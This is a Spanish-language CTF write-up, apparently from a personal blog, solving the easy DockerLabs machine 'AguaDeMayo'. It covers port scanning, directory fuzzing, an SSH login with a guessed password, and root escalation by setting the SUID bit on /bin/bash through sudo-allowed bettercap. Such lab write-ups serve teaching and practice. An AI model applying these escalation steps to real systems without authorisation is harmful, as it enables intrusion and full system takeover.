---
layout: post
title: "AguaDeMayo"
date: 2024-08-16 14:40:23
category: dockerlabs
vm: dockerlabsfacil
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> AguaDeMayo </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Nivel:</strong> <span class="easy">Facil</span></td> </tr>
  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
</table>

<br>

![img](/notas/public/img/dockerlabs/aguademayo/host.png)

**1\.** Escaneo los puertos abiertos de la maquina.

`sudo nmap -p- --open -sS -T5 --min-rate=5000 -sCV -Pn -n 172.17.0.2`

![img](/notas/public/img/dockerlabs/aguademayo/nmap.png)

**2\.** Tengo apache por defecto en la web, pero por debajo en el codigo fuente tenemos un mensaje oculto en codigo Brainfuck.

`http://172.17.0.2`

![img](/notas/public/img/dockerlabs/aguademayo/80.png)
![img](/notas/public/img/dockerlabs/aguademayo/80code.png)

**3\.** Decodeamos el mensaje con esta herramienta online [dcode](https://www.dcode.fr/brainfuck-language).

![img](/notas/public/img/dockerlabs/aguademayo/dcode.png)

**4\.** Hago un poco de fuzzing y encuentro una ruta de imagenes.

`gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt -q`

![img](/notas/public/img/dockerlabs/aguademayo/gobuster.png)

**5\.** Me descargo la imagen que tenemos en la ruta para analizarlo.

`http://172.17.0.2/images/`

![img](/notas/public/img/dockerlabs/aguademayo/images.png)

_No encontre nada en sus metadatos_

**6\.** Lo proximo fue que me fije en el nombre, dice agua y luego ssh, probe con usuario agua y la contraseña bebeaguaqueessano.

`http://172.17.0.2/images/agua_ssh.jpg`

`ssh agua@172.17.0.2`

![img](/notas/public/img/dockerlabs/aguademayo/agua.png)
![img](/notas/public/img/dockerlabs/aguademayo/ssh.png)

**7\.** El usuario tiene un binario con permisos de sudo.

`sudo -l`

![img](/notas/public/img/dockerlabs/aguademayo/sudol.png)

**8\.** En el panel de ayuda de bettercap nos indica como ejecutar comandos, en realidad ya somos root.

`sudo /usr/bin/bettercap`

`help`

![img](/notas/public/img/dockerlabs/aguademayo/bettercaphelp.png)

**9\.** Para tener la tipica bash, hacemos lo siguiente: estando en bettercap como root le damos permisos suid a la bash y listo.

`!chmod u+s /bin/bash`

`quit`

`/bin/bash -p`

![img](/notas/public/img/dockerlabs/aguademayo/root.png)

<br>

<a href="#">_Finalizado._</a>